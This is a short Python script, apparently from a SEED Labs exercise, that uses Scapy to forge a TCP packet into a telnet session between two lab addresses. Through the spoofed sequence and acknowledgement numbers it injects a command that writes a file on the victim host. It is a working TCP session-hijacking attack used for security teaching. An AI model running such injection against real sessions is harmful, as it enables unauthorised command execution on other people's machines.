#!/usr/bin/env python3
from scapy.all import *


ip = IP(src="10.9.0.5", dst="10.9.0.6")
tcp = TCP(sport=39530, dport=23, flags="A", seq=2843094327, ack=642852136)
data = "\necho 'This is my name Sabrina' > /home/seed/s4073609.txt\n"

pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)


